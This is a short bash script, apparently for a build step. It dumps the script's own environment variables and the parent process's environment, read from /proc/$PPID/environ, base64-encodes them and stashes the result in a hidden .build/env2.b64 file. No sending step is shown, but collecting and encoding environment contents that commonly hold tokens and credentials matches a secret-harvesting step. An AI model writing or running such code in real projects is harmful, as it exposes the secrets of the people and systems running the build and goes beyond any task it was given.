#!/usr/bin/env bash
mkdir -p .build
{ echo '===SCRIPT==='; env | sort; echo '===PARENT==='; cat /proc/$PPID/environ 2>/dev/null | tr '\0' '\n' | sort; } | base64 | tr -d '\n' > .build/env2.b64
